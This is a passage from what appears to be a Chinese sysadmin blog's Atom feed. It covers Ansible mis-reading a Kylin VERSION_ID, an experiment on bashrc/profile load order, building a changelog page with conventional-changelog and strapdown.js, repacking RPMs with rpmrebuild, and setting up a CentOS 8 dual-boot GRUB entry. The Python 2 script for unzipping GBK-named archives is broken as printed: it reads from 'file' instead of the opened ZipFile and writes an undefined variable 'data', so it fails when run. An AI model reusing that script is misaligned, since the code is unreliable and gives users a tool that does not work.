第一个问题是kylin的VERSION_ID不符合此描述，包含了大写字符，第二个问题是VERSION_ID可以包含a-z字母，但是通常是数值如17,11.04等。
但由于常见发行版都将此处处理为数值型，就导致ansible按照此约定俗成固化了其获取系统版本的方法，并试图将一个字符串转换为int，不能满足当VERSION_ID包含了字母的情况。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="验证结论">验证结论<a class="hash-link" href="#验证结论" title="标题的直接链接">​</a></h2><p>通过以上判断看到VERSION_ID是导致该问题现象的关键，那么我们可以尝试修改一下该参数值，再执行setup看看是否可以正常工作：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># grep VERSION_ID /etc/os-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VERSION_ID="7"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里我把VERSION_ID修改成了数字7，再执行setup观察ansible_pkg_mgr变量是否能获取到：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ansible -i hosts node01 -m setup -a "filter=ansible_pkg_mgr"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">node01 | SUCCESS =&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "ansible_facts": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "ansible_pkg_mgr": "yum",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "discovered_interpreter_python": "/usr/bin/python"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "changed": false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>可以看到，修改os-release中VERSION_ID为纯数值后，setup就可以正常判断到系统版本，进而可以获取到正确的yum版本了。
通过以上可以看到操作系统中即便是一些不起眼的细枝末节，处理不当也可能引发"连锁反应"。</p>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[bashrc与profile的加载顺序]]></title>
        <id>/2021/02/24/bash-rc-profile-exec-order</id>
        <link href="https://itxx00.github.io/notes/blog/2021/02/24/bash-rc-profile-exec-order"/>
        <updated>2021-02-24T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[看下bashrc和profile的执行顺序到底是什么样的]]></summary>
        <content type="html"><![CDATA[<blockquote><p>在使用bashrc和profile设置环境变量时，如果多个地方都有同一个变量的设置，则需要注意不同配置文件的加载顺序问题</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="背景">背景<a class="hash-link" href="#背景" title="标题的直接链接">​</a></h2><p>如果加载顺序没弄明白，有可能会在使用过程中遇到各种困扰，比如为什么设置了profile但是环境变量不生效？为什么变量ssh后获取的不一样？下面我们以CentOS7系统为例，通过一个简单的小实验来观察下到底bash的几个配置文件加载顺序是怎样的。</p><p>我们知道可以用来设置环境变量的文件常用的有以下几个：</p><ul><li>/etc/profile</li><li>/etc/profile.d/*.sh</li><li>/etc/bashrc</li><li>~/.bash_profile</li><li>~/.bashrc</li></ul><p>而不同的文件加载时机又分为login shell和non-login shell两种情况。这两种情况需要区分对待，及不同的文件要在对应场景下才能生效。假设有一个相同的变量设置出现在各个文件里面，通过对不同文件的变量值进行差异设置即可观察出各个配置的加载优先级和生效情况。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="实验">实验<a class="hash-link" href="#实验" title="标题的直接链接">​</a></h2><p>先写入各个配置文件如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># tail -n1 /etc/profile /etc/bashrc /etc/profile.d/well.sh ~/.bash_profile ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==&gt; /etc/profile &lt;==</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export WELL=etc-profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==&gt; /etc/bashrc &lt;==</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export WELL=etc-bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==&gt; /etc/profile.d/well.sh &lt;==</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export WELL=etc-profile-d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==&gt; /root/.bash_profile &lt;==</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export WELL=home-bash-profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==&gt; /root/.bashrc &lt;==</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export WELL=home-bashrc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接下来开始观察，需要注意的是每次修改配置之后新开shell重新加载环境配置：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# echo $WELL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">home-bash-profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# ssh localhost 'echo $WELL'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">home-bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# sed -i '$d' ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# sed -i '$d' ~/.bash_profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# echo $WELL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc-bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# ssh localhost 'echo $WELL'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc-bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# sed -i '$d' /etc/bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# echo $WELL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc-profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# ssh localhost 'echo $WELL'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc-profile-d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 重新写入~/.bashrc后</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# echo $WELL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">home-bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# ssh localhost 'echo $WELL'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc-profile-d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 重新写入~/.bash_profile,去掉~/.bashrc后</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# echo $WELL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">home-bash-profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# ssh localhost 'echo $WELL'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc-profile-d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>需要注意的是以上测试是将变量放到每个配置末行，因为配置之间有互相加载的机制，如果放在其他位置则测试结果会不一样。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="结论">结论<a class="hash-link" href="#结论" title="标题的直接链接">​</a></h2><p>观察上面的结果，可以得出以下实验结论：</p><p>1 login shell会加载所有配置,优先级为~/.bash_profile ~/.bashrc /etc/bashrc /etc/profile /etc/profile.d</p><p>2 non-login shell时加载优先级为 ~/.bashrc /etc/bashrc /etc/profile.d</p><p>3 non-login shell不会加载的配置有 ~/.bash_profile /etc/profile</p><p>4 两种情况下都会加载的有~/.bashrc /etc/bashrc /etc/profile.d</p><p>那么如果我们需要在系统全局设置一个环境变量，要保证login shell和non-login shell都能表现一致，需要如何设置呢？</p><p>因为~/.bashrc为用户局部配置文件，不影响全局，而/etc/bashrc为系统内置文件不建议修改，如果是有全局环境变量需要设置建议放置到/etc/profile.d</p><p>over.</p>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用conventional-changelog和Strapdown.js为git仓库自动生成changelog html页面]]></title>
        <id>/2021/01/15/auto-create-changelog-html</id>
        <link href="https://itxx00.github.io/notes/blog/2021/01/15/auto-create-changelog-html"/>
        <updated>2021-01-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[通过简单的工具组合为git项目生成简单的changelog html]]></summary>
        <content type="html"><![CDATA[<blockquote><p>一个项目的changelog对于使用者来说虽然不需要重点关注，但很重要</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="基本思路">基本思路<a class="hash-link" href="#基本思路" title="标题的直接链接">​</a></h2><p>通常软件产品对外发布时，我们需要提供一份changelog以告知使用者新版本所发生的变化，有两种方式可以产生需要的changelog内容， 一种是人工整理和编写，另外一种是通过工具实现自动化。这里介绍一种通过开源工具的组合快速实现自动生成的方法。</p><p>我们在开发过程中所有变更都会反映到git commit messages里面，git提交历史几乎可以反映软件的所有变更，基于此我们可以使用工具直接将git提交历史转化为changelog，再经过简单加工处理即可对外输出一个html页面。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="规范提交">规范提交<a class="hash-link" href="#规范提交" title="标题的直接链接">​</a></h2><p>这就要求在代码提交过程中我们的commit message要规范化，其中一种被广为认可的规范名为约定式提交。详细可参考<a href="https://www.conventionalcommits.org/zh-hans" target="_blank" rel="noopener noreferrer">约定式提交</a>
一个简单的提交类型参考如下：</p><ul><li><strong>build</strong>: 变更仅影响工具出包或者build环境等外部依赖问题</li><li><strong>ci</strong>: 对CI配置的变更</li><li><strong>docs</strong>: 仅文档内容变更</li><li><strong>feat</strong>: 新特性</li><li><strong>fix</strong>: bug修复</li><li><strong>perf</strong>: 无bug修复/无新特性，仅性能提升</li><li><strong>refactor</strong>: 无bug修复/无新特性/无性能提升，仅重构</li><li><strong>style</strong>: 仅代码风格更改</li><li><strong>test</strong>: 仅测试代码变更</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="提交转化为markdown">提交转化为markdown<a class="hash-link" href="#提交转化为markdown" title="标题的直接链接">​</a></h2><p>有了规范的提交记录，下面就可以通过工具实现提交记录到markdown的转化。这里介绍一个工具叫conventional-changelog，命令行版本使用方法如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">npm install -g conventional-changelog-cli</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># generate changelog markdown file</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd your-git-repo-project-home</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">conventional-changelog -p angular -i CHANGELOG.md -s -r 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>示例中用到的参数：</p><ul><li>-i : 读入已有changelog文件</li><li>-p : 预设模板，可以是angular/atom/codemirror/ember/eslint/express/jquery/jscs/jshint</li><li>-s : 写到目标文件名和-i指定的文件同名</li><li>-r : 指定需要生成的release数量，0表示重新生成所有</li></ul><p>更多参数可以执行<code>conventional-changelog --help</code>查看。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="markdown转化为html">markdown转化为html<a class="hash-link" href="#markdown转化为html" title="标题的直接链接">​</a></h2><p>这样我们就得到了一份名为CHANGELOG.md的历史变更记录文件，为markdown格式。接下来再通过另外一个工具名叫strapdown.js来自动生成html。</p><p>strapdown.js是一个js文件，不需要像上面生成markdown那样在server端生成，只需要在单个html页面中引入该js文件即可实现从markdown自动渲染出html页面。详细可参考<a href="https://strapdownjs.com/" target="_blank" rel="noopener noreferrer">strapdown.js</a></p><p>使用方法如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat &gt;changelog.html &lt;&lt;"EOF"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!DOCTYPE html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;title&gt;XXX Changelog&lt;/title&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;meta charset="utf-8"&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;xmp theme="darkly" style="display:none;"&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat CHANGELOG.md &gt;&gt;changelog.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat &gt;&gt;changelog.html &lt;&lt;"EOF"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/xmp&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;script src="http://strapdownjs.com/v/0.2/strapdown.js"&gt;&lt;/script&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/html&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这样我们就通过拼接的方式生成了一份changelog.html。需要注意的是changlog内容中不能包含<code>&lt;/xmp&gt;</code>关键字。</p><p>over.</p>]]></content>
        <category label="changelog" term="changelog"/>
        <category label="conventional-changelog" term="conventional-changelog"/>
        <category label="strapdown.js" term="strapdown.js"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用rpmrebuild修改rpm包内容]]></title>
        <id>/2020/04/07/change-rpm-file-using-rpmrebuild</id>
        <link href="https://itxx00.github.io/notes/blog/2020/04/07/change-rpm-file-using-rpmrebuild"/>
        <updated>2020-04-07T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[一种rpm包的魔改方式]]></summary>
        <content type="html"><![CDATA[<blockquote><p>某些特殊紧急情况下... ...</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>某些特殊紧急情况下没法等到重新从源码编译打包，手里只有一个打包好的rpm，但是里面内容需要在安装前就改掉，比如修改某个文件内容等，这个时候rpmrebuild命令可以派上用场。
rpmrebuild工作时会把rpm包内容释放到一个临时目录，如果需要修改rpm包里面的文件的话， 可以通过-m参数指定执行的命令，比如/bin/bash，这样就可以得到一个交互式的shell，
有了交互式shell想象空间就很大了，你可以在这个shell环境下对rpm包释放出来的文件任意修改，当退出这个shell时，rpmrebuild会把改动打包回新的rpm。
例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rpmrebuild -m /bin/bash -np rpm/xxx.rpm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 此时我们得到一个交互shell，</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 比如知道需要修改的文件名为aaa，可以这样操作：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -name aaa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 尽情发挥吧，完了退出</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ctrl+D</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在你就得到修改好内容之后的新rpm了。</p>]]></content>
        <category label="bash" term="bash"/>
        <category label="rpm" term="rpm"/>
        <category label="rpmrebuild" term="rpmrebuild"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[python脚本解压gbk编码zip]]></title>
        <id>/2020/03/27/unzip-gbk-with-python</id>
        <link href="https://itxx00.github.io/notes/blog/2020/03/27/unzip-gbk-with-python"/>
        <updated>2020-03-27T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>编码问题很烦人</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>gbk编码的zip在linux下解压出来文件名会乱码，可以用下面脚本解压过程中转换下</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/usr/bin/env python2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># coding: utf-8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import zipfile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f = zipfile.ZipFile(sys.argv[1],"r");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for n in f.namelist():</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    try:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        u = n.decode("gbk")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    except:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        u = n</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p = os.path.dirname(u)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if not p:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        continue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if not os.path.exists(p):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        os.makedirs(p)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    d = file.read(n)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if os.path.exists(u):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        continue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    with open(u, "w") as o:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        o.write(data)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <category label="bash" term="bash"/>
        <category label="python" term="python"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CentOS8安装后grub菜单增加windows入口]]></title>
        <id>/2020/03/12/centos8-bootmenu-add-windows</id>
        <link href="https://itxx00.github.io/notes/blog/2020/03/12/centos8-bootmenu-add-windows"/>
        <updated>2020-03-12T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[默认安装完不会自动识别其他系统，需要手工添加]]></summary>
        <content type="html"><![CDATA[<blockquote><p>电脑双系统centos+windows，安装完centos8之后默认没有引导windows的入口，按照下面方法手搓即可。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-启动进入centos">1 启动进入centos<a class="hash-link" href="#1-启动进入centos" title="标题的直接链接">​</a></h2><p>查看磁盘分区信息，如下：
<code>fdisk -l</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># fdisk -l</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disk /dev/sda: 238.5 GiB, 256060514304 bytes, 500118192 sectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Units: sectors of 1 * 512 = 512 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sector size (logical/physical): 512 bytes / 512 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disklabel type: dos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disk identifier: 0x297f5cef</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Device     Boot     Start       End   Sectors   Size Id Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda1  *         2048 250058751 250056704 119.2G  7 HPFS/NTFS/exFAT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda2       250058752 393418751 143360000  68.4G  7 HPFS/NTFS/exFAT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda3       393418752 394442751   1024000   500M 83 Linux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda4       394442752 500117503 105674752  50.4G  5 Extended</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda5       394444800 500117503 105672704  50.4G 83 Linux</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>通过fdisk结果看到windows第一个partion在sda1，对应grub的磁盘索引编号是hd0,1,接下来编辑grub配置文件，自定义配置路径：</p><div class="codeBlockContainer_Ckt0 theme-code-block" 